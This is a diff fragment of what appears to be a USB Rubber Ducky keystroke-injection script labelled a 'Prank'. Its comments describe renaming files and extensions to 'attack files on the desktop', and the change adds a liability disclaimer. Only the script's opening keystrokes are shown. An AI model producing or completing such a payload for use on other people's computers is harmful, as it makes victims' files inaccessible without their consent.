@@ -7,7 +7,7 @@ REM Category: Prank
 
 REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 23 to 28, and paste in the space provided, changing the target directory name.
 REM ~~~~~ CAN RUN SCRIPT 'AS IS' (WITHOUT CHANGES) - Will just attack files on the desktop
-
+REM ~~~~~ Use responsibly and within the confines of the law. This script renames files AND extensions and can result in being unable to access files if you don't know which file was which. I accept no responsibility for any loss of files or any other consequences. Use at your own risk. 
 DELAY 1000
 GUI r
 DELAY 200
